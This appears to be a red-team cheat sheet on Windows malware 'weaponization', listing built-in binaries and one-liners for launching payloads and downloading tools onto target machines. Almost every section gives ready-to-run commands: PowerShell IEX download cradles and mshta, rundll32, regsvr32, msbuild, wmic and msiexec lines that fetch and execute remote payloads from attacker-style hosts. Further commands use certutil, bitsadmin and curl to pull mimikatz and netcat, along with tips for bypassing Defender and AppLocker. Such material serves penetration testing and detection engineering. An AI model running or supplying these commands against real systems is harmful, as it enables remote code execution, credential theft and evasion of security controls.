# Weaponziation: Malware Exploitation
A curated list of tools and techniques written from experience in red teaming and weaponization of malware used in enterprise environments to trigger attacker exploitation code. 

## Code Execution Methods / Launchers

The methods outlined below are used to execute payloads on a local machine, hosted from a remote server or run in memory. 

### Powershell
Endless methods here, lots of obfuscation techniques, just test and choose one that works in your environment.
  * [Infoke-Obfuscation Guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide): Infamous Powershell obfuscator by Daniel Bohannon
  * [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter): Cradle obfuscator by Daniel Bohannon
  * [Powershell without Powershell.exe](https://medium.com/@Bank_Security/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628)
  * [Powershell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239): Cradles by HarmJ0y


Basic example to execute in memory:
```
powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('https://Domain.com/Payload.ps1')
powershell -c IEX (IWR https://Domain.com/Payload.ps1)
```
Powershell from a WebDAV server:
```
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
[PowerLine](https://github.com/fullmetalcache/PowerLine) - Compile EXE then transfer it to victim machine to execute Powershell commands without Powershell.exe.
It has to be compiled with the scripts you wish to load within the config (i.e. PowerUp.ps1, Invoke-Mimikatz.ps1, etc.).
```
PowerLine.exe -ShowScripts
PowerLine.exe PowerUp "Invoke-AllChecks"
```
  
### Mshta (HTA)
Microsoft binary to execute HTML Application (HTA) files or inline scripts.
Frameworks like Empire, Metasploit and Unicorn all output HTA payload file formats. 
* [Red Canary HTA Github](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md)
* [MITRE: Mshta](https://attack.mitre.org/techniques/T1170/)
```
1. mshta vbscript:Close(Execute("GetObject(""script:http://WebServer/payload.sct"")"))
2. mshta https://WebServer/payload.hta
3. mshta \\WebDAVserver\folder\payload.hta
```
  
### Rundll32
Microsoft binary to execute code inside a .DLL file. Custom .DLLs can be written in languages such as Csharp to fully bypass detection. 

  * [Lobas-Project Rundll32 Methods](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
  * [Atomic red team Rundll32 payloads](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1085/T1085.md)
```
rundll32 C:\yourfile.dll,EntryPoint 
--> yourfile.dll is your malicious .DLL
--> EntryPoint is the function called within the .DLL
```
Run inline VBscript:
```
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("Wscript.Echo ""Hi there!"""),0)
```
Run remote SCT payload:
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://WebServer/payload.sct");window.close();
```

### MsBuild
Windows .NET executable for building and executing custom Csharp project files on the fly.
  * [Remotely host MsBuild payloads](https://fortynorthsecurity.com/blog/remotely-host-msbuild-payloads/): Remote hosting of MsBuild payloads on WebDav servers to execute locally (April 2020) 

Running local  XML or Csproj payload files:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Payload.xml
```
Running payload hosted on a WebDav server to run in memory:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\WebDAVserver\Payload.xml
```

### Regsvr32
Windows command-line tool to register and unregister dll files. Can be used to bypass some controls such as AppLocker
  * [Bypass Application Whitelisting using regsrv32.exe (Multiple Methods)](https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/)

Method 1: Web server delivery. Written on disk in IE local cache.
Command to run on target machine:
```
regsvr32 /u /n /s /i:http://yourdomain.com/payload.sct scrobj.dll
```
Method 2: WebDAV server. Written on disk in WebDAV client local cache.
Command to run on target machine:
```
regsvr32 /u /n /s /i:\\WebDavServer\tmp\payload.sct scrobj.dll
```

### Wmic
Use Wmic to execute a local or remote XSL (eXtensible Stylesheet Language) file which contains scripting payloads
```
Execute local/remote file: 
wmic os get /format:"https://yourdomain/payload.xsl"

Exeucte some command:
wmic process call create "cmd.exe /c shell.exe"
```

### Cscript / Wscript
Both executables are part of the Windows Script Host (WSH) which is used for scripting capabilities.
**Cscript.exe** allows for execution of VBS, JS, and WSH scripts entirely in command-line.
**Wscript.exe** does the same but pops up a Windows dialoge box for user interaction.
  * [Cscript app whitelisting bypass](https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404)
Cscript.exe methods:
```
1. Run locally
cscript.exe testscript.vbs

2. WebDav server
cscript //E:jscript \\WebDavServer\folder\payload.vbs
```

### Msiexec
Windows comes with a Windows installer engine for MSI packages to install new apps called **Msiexec.exe**. Malicious .msi files can be created to execute payloads.
```
msiexec /q /i http://YourDomain/payload.msi
```

## Payload Downloading and Delivery Methods

The methods listed below are used to transfer and download remote files onto target machines for payload execution or post-exploitation activities. 

[Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

### Powershell
The most pervasive method these days which may be monitoried from blue team, logged for later analysis and possibly blocked in some environments. 

[SANS Powershell one-liners](https://www.sans.org/blog/pen-test-poster-white-board-powershell-one-line-web-client/)
```
# DownloadFile method
powershell -c (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "%temp%\archive.zip")

# Invoke-WebRequest method
powershell -c IWR "https://example.com/mimikatz.exe" -OutFile ".\mimikatz.exe" 

# Wget in Powershell (Windows 8 and later)
powershell -c wget "http://www.yourdomain.com/file.exe" -outfile "OutputFile.exe"
```

### Curl
Linux and Windows 10 (build #17063 and later) operating systems tool to bypass controls since it doesn't get flagged by most AV's (yet).

Reference: https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983
```
curl -o nc.exe https://yourdomain.com/nc.exe
```

### Certutil
Windows built-in binary for downloading remote files, encoding and decoding them. Blocked on recent builds of Windows 10 with Defender but will still bypass some other AV vendors like Symantec.
```
File downloads:
certutil -urlcache -f https://download.sysinternals.com/files/PSTools.env pstools.env

File encoding and decoding:
certutil -encode pstools.zip pstools.env
certutil -decode pstools.env pstools.zip
```

### Bitsadmin
Windows command-line utility for managing BITS jobs and transferring files.
Blocked by modern Windows 10 Defender but can usually be copied to another EXE to bypass.

Basic example:
```
bitsadmin /transfer job https://Domain.com/Payload.ps1 Payload.ps1
```
Method to bypass Win 10 Defender by copying "bitsadmin.exe" to a separate file for execution:
```
copy /Y C:\Windows\System32\bitsadmin.exe %temp%\Update.exe
%temp%\Update.exe /transfer newjob https://Domain.com/mimikatz.exe %temp%\mimikatz.exe
```
PowerShell method:
```
PS# Start-BitsTransfer https://Domain.com/mimikatz.exe %temp%\mimikatz.exe
```
